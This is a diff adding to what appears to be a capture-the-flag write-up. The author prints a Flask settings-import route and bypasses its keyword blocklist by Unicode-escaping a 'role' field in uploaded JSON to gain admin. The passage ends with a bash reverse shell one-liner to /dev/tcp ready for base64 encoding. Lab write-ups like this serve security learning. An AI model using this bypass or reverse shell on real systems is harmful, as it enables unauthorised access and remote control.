@@ -163,3 +163,170 @@ ilovehacking     (editor)
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
 ```
+
+Login as `editor` give me access to new function which is `Settings`
+<img width="1908" height="936" alt="Screenshot 2026-05-26 at 6 23 26 pm" src="https://github.com/user-attachments/assets/1f3c7ecb-e69d-42e1-bc22-35c3abef4fce" />
+
+Having a look at setting function to understand the system. This function caught my attention
+```
+@app.route('/settings/import', methods=['POST'])
+def settings_import():
+    if 'user_id' not in session or session['role'] not in ['editor', 'admin']:
+        return redirect(url_for('dashboard'))
+    
+    if 'config_file' not in request.files:
+        return render_template_string(SETTINGS_TEMPLATE,
+                                     role=session['role'],
+                                     profile=session.get('profile', {}),
+                                     error='No file uploaded')
+    
+    file = request.files['config_file']
+    
+    if file.filename == '':
+        return render_template_string(SETTINGS_TEMPLATE,
+                                     role=session['role'],
+                                     profile=session.get('profile', {}),
+                                     error='No file selected')
+    
+    try:
+        content = file.read().decode('utf-8')
+        
+        dangerous_patterns = ['__class__', '__globals__', '__builtins__', '__init__', 
+                              '__dict__', 'role', 'user_id', 'username']
+        
+        for pattern in dangerous_patterns:
+            if pattern in content.lower():
+                raise ValueError(f'Potentially dangerous configuration detected: {pattern}')
+        
+        config_data = json.loads(content)
+        
+        if not isinstance(config_data, dict):
+            raise ValueError('Invalid JSON structure')
+        
+        if 'profile' in config_data and isinstance(config_data['profile'], dict):
+            if 'profile' not in session:
+                session['profile'] = {}
+            session['profile'].update(config_data['profile'])
+        
+        for key, value in config_data.items():
+            if key == 'profile':
+                continue
+            
+            if key in ['user_id', 'username', '_sa_instance_state']:
+                continue
+            
+            if isinstance(value, dict):
+                if key in session and isinstance(session[key], dict):
+                    session[key].update(value)
+                else:
+                    session[key] = value
+            elif isinstance(value, (str, int, float, bool, list, type(None))):
+                session[key] = value
+        
+        session.modified = True
+        
+        db = get_db()
+        db.execute('INSERT INTO logs (user_id, action, metadata) VALUES (?, ?, ?)', 
+                  (session['user_id'], 'Imported configuration', f'filename={file.filename}'))
+        db.commit()
+        
+        return render_template_string(SETTINGS_TEMPLATE,
+                                     role=session['role'],
+                                     profile=session.get('profile', {}),
+                                     success='Configuration imported successfully')
+    except ValueError as ve:
+        if 'profile' not in session or not isinstance(session.get('profile'), dict):
+            session['profile'] = {}
+        return render_template_string(SETTINGS_TEMPLATE,
+                                     role=session['role'],
+                                     profile=session.get('profile', {}),
+                                     error=f'Validation error: {str(ve)}')
+    except Exception as e:
+        if 'profile' not in session or not isinstance(session.get('profile'), dict):
+            session['profile'] = {}
+        
+        return render_template_string(SETTINGS_TEMPLATE,
+                                     role=session['role'],
+                                     profile=session.get('profile', {}),
+                                     error=f'Import failed: {str(e)}')
+```
+
+For the import function allow me to upload a json format file to load new preference for the profile. Constructing the payload requires 3 fields
+```
+{
+  "profile": {
+    "bio": "",
+    "display_name": "",
+    "website": ""
+  }
+}
+```
+
+Reference:
+```
+@app.route('/settings', methods=['GET'])
+def settings():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    
+    if session['role'] not in ['editor', 'admin']:
+        return redirect(url_for('dashboard'))
+    
+    if 'profile' not in session:
+        session['profile'] = {'display_name': '', 'bio': '', 'website': ''}
+    
+    return render_template_string(SETTINGS_TEMPLATE,
+                                 role=session['role'],
+                                 profile=session.get('profile', {}))
+```
+Furthermore, I want to escalate the privilege of user `editor` to `admin` so I am going to embeded another field `role` to the json file
+```
+{
+  "profile": {
+    "bio": "nothing",
+    "display_name": "nothing",
+    "website": "nothing",
+    "role": "admin"
+  }
+}
+```
+
+<img width="1207" height="812" alt="Screenshot 2026-05-26 at 6 39 23 pm" src="https://github.com/user-attachments/assets/80e75c41-f818-4206-a801-d0e20c669005" />
+Looking at the source code, special strings or patterns like these below are banned
+```
+['__class__', '__globals__', '__builtins__', '__init__', 
+                              '__dict__', 'role', 'user_id', 'username']
+```
+However, I just need to encode the string from `role` to unicode `\u0072\u006f\u006C\u0065`
+```
+{
+  "profile": {
+    "bio": "nothing",
+    "display_name": "nothing",
+    "website": "nothing",
+    "\u0072\u006f\u006C\u0065": "admin"
+  }
+}
+```
+
+Reference for unicode table : [table](https://symbl.cc/en/unicode-table/#basic-latin)
+
+This works, however, nothing happens and the UI still the same. Probably I need to modify the payload
+```
+{
+  "profile": {
+    "bio": "nothing",
+    "display_name": "nothing",
+    "website": "nothing"
+  },
+  "\u0072\u006f\u006C\u0065": "admin"
+}
+
+This one gives me a new function which is `Admin` and also escalates me straight to `Admin`.
+My goal is to land a reverse shell, here is the payload
+```
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+```
+Then using base64 to encode it
+
